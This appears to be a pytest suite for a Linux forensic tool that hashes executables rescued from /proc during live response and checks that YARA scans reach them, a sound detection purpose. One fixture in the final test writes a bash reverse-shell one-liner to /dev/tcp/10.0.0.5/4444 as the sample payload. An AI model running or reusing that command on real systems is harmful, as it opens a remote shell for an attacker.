"""The binary UAC already rescued, which nothing opened.

`live_response/process/proc/<pid>/recovered_exe` is the executable copied back
out of /proc while the process ran -- including when the file had already been
unlinked. For a payload that deletes itself that copy is the only one in the
acquisition, and `lin_hashes` cannot cover it by construction: it reads the
digests UAC precomputes for executables ON DISK.
"""
from __future__ import annotations

import hashlib
import logging
from pathlib import Path

import pytest

from artifact_engine.core.runner import ParserContext
from artifact_engine.handlers import lin_recovered_exe as R


def _ctx(evidence: Path, out: Path) -> ParserContext:
    return ParserContext(
        evidence=evidence, out=out, tools=evidence, assets=evidence,
        machine_name="host", volume="live", log=logging.getLogger("aeng.test"),
    )


def _process(lr: Path, pid: str, *, argv: list[str], comm: str,
             blob: bytes | None = None) -> Path:
    d = lr / "process" / "proc" / pid
    d.mkdir(parents=True, exist_ok=True)
    (d / "cmdline.txt").write_bytes(("\x00".join(argv) + "\x00").encode())
    (d / "comm.txt").write_text(comm + "\n", encoding="utf-8")
    (d / "status.txt").write_text(f"Name:\t{comm}\nUid:\t0\t0\t0\t0\n", encoding="utf-8")
    if blob is not None:
        (d / "recovered_exe").write_bytes(blob)
    return d


def _exe_listing(lr: Path, entries: dict[str, str]) -> None:
    (lr / "process").mkdir(parents=True, exist_ok=True)
    (lr / "process" / "running_processes_full_paths.txt").write_text(
        "\n".join(f"lrwxrwxrwx 1 root root 0 May 18 06:31 /proc/{pid}/exe -> {t}"
                  for pid, t in entries.items()) + "\n", encoding="utf-8")


def _rows(evidence: Path, out: Path) -> dict[str, dict]:
    R.run(_ctx(evidence, out))
    lines = (out / "recovered_exe.csv").read_text(encoding="utf-8").splitlines()
    header = lines[0].split(",")
    return {r["pid"]: r for r in (dict(zip(header, ln.split(","))) for ln in lines[1:])}


_BLOB = b"\x7fELF" + b"payload-bytes" * 64


@pytest.fixture
def case(tmp_path) -> Path:
    lr = tmp_path / "live_response"
    _process(lr, "15289", argv=["/usr/lib/systemd/systemd-logind"], comm="crond",
             blob=_BLOB)
    _process(lr, "900", argv=["/usr/sbin/sshd"], comm="sshd", blob=b"\x7fELFordinary")
    _exe_listing(lr, {"15289": "/tmp/staged (deleted)", "900": "/usr/sbin/sshd"})
    return tmp_path


def test_the_only_copy_of_a_deleted_payload_gets_hashed(case):
    """The binary is gone from disk, so it is not in UAC's precomputed executable
    hashes and never will be. This file is the evidence."""
    row = _rows(case, case / "CSVs")["15289"]
    assert row["sha256"] == hashlib.sha256(_BLOB).hexdigest()
    assert row["md5"] == hashlib.md5(_BLOB).hexdigest()
    assert row["size"] == str(len(_BLOB))
    assert row["exe_deleted"] == "yes"


def test_a_row_says_which_process_it_came_from(case):
    """A hash with no provenance cannot be chased back into the case."""
    row = _rows(case, case / "CSVs")["15289"]
    assert row["comm"] == "crond"
    assert row["argv0"] == "/usr/lib/systemd/systemd-logind"
    assert row["exe"].startswith("/tmp/staged")


def test_a_binary_still_on_disk_is_not_marked_deleted(case):
    assert _rows(case, case / "CSVs")["900"]["exe_deleted"] == ""


def test_the_size_is_a_column_because_the_hash_is_the_part_that_changes(case):
    """Implants in a family get rebuilt per host: same code, different padding,
    different digest. The size is the join that survives repacking, and it is a
    column precisely so `aeng sweep -q <size>` can ask the rest of the case."""
    lr = case / "live_response"
    repacked = _BLOB[:-1] + b"X"                 # same length, different bytes
    _process(lr, "15290", argv=["/usr/sbin/httpd"], comm="httpd", blob=repacked)

    rows = _rows(case, case / "CSVs")
    assert rows["15289"]["sha256"] != rows["15290"]["sha256"]
    assert rows["15289"]["size"] == rows["15290"]["size"]


def test_a_process_without_a_rescued_binary_is_simply_absent(case):
    """UAC does not recover one for every process (kernel threads have no exe).
    An empty row would read as a binary of zero bytes."""
    _process(case / "live_response", "2", argv=[], comm="kthreadd")
    assert "2" not in _rows(case, case / "CSVs")


def test_an_unreadable_binary_keeps_its_row_and_says_so(case, caplog):
    """A rescued implant that silently never appeared in the CSV is the worst
    outcome here. A row with empty digests can be chased; a missing one cannot."""
    d = case / "live_response" / "process" / "proc" / "31000"
    d.mkdir(parents=True)
    (d / "comm.txt").write_text("x\n", encoding="utf-8")
    (d / "recovered_exe").write_bytes(b"")
    import artifact_engine.handlers.lin_recovered_exe as mod
    real = mod._digests
    mod._digests = lambda p: ("", "", 0) if p.parent.name == "31000" else real(p)
    try:
        with caplog.at_level(logging.WARNING, logger="aeng.test"):
            rows = _rows(case, case / "CSVs")
    finally:
        mod._digests = real
    assert "31000" in rows and rows["31000"]["sha256"] == ""
    assert any("could not read" in r.message for r in caplog.records)


def test_nothing_recovered_writes_nothing(tmp_path):
    (tmp_path / "live_response" / "process").mkdir(parents=True)
    out = tmp_path / "CSVs"
    R.run(_ctx(tmp_path, out))
    assert not (out / "recovered_exe.csv").exists()


# --------------------------------------------------------------------------- #
# What YARA is pointed at
# --------------------------------------------------------------------------- #
def test_yara_reaches_the_rescued_binaries_and_nothing_else_in_the_tree(case):
    """The rescued binary lives outside [root], so the filesystem walk cannot
    reach it. The rest of the per-PID tree stays out on purpose: running malware
    rules over a dump of a process's memory matches whatever that process was
    holding, which on an EDR agent is a signature database."""
    d = case / "live_response" / "process" / "proc" / "15289"
    (d / "memory_strings.txt").write_bytes(b"strings of whatever was in memory")
    (d / "maps.txt").write_bytes(b"7f0000000000-7f0000001000 r-xp")

    found = dict(R.recovered_binaries(case))
    assert set(found) == {"15289", "900"}
    assert all(p.name == "recovered_exe" for p in found.values())


def test_yara_actually_matches_inside_a_rescued_binary(tmp_path):
    """End to end with the bundled rules: a payload staged in memory and unlinked
    from disk is reachable by NO walk of the filesystem, so before this the scan
    could only ever have found it if the attacker had left the file behind."""
    import shutil

    pytest.importorskip("yara")
    from artifact_engine.config import DATA_DIR
    from artifact_engine.handlers import lin_yara

    rules_dir = tmp_path / "assets" / "yara"
    rules_dir.mkdir(parents=True)
    for yar in (DATA_DIR / "assets" / "yara").glob("*.yar"):
        shutil.copy(yar, rules_dir / yar.name)

    (tmp_path / "[root]" / "tmp").mkdir(parents=True)
    lr = tmp_path / "live_response"
    _process(lr, "15289", argv=["/usr/lib/systemd/systemd-logind"], comm="crond",
             blob=b"#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n")

    ctx = ParserContext(evidence=tmp_path, out=tmp_path / "CSVs", tools=tmp_path,
                        assets=tmp_path / "assets", machine_name="h", volume="live",
                        log=logging.getLogger("aeng.test"))
    lin_yara.run(ctx)
    out = (tmp_path / "CSVs" / "yara.csv").read_text(encoding="utf-8")
    assert "live_response/process/proc/15289/recovered_exe" in out
